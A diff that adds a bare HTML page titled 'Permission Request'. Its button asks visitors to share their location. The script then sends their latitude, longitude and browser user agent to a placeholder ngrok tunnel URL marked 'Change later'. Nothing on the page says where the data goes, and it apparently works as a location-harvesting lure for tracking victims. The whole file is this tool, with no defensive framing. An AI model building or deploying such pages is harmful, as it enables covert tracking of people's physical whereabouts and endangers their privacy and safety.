@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Permission Request</title>
+</head>
+<body>
+<h2>Please allow location access</h2>
+<button onclick="getLocation()">Share Location</button>
+
+<script>
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(sendData, showError);
+  } else {
+    alert("Geolocation not supported");
+  }
+}
+
+function sendData(position) {
+  fetch("https://YOUR_NGROK_URL/collect", { // Change later
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      latitude: position.coords.latitude,
+      longitude: position.coords.longitude,
+      userAgent: navigator.userAgent
+    })
+  });
+}
+
+function showError(error) {
+  alert("Permission denied or error getting location.");
+}
+</script>
+</body>
+</html>
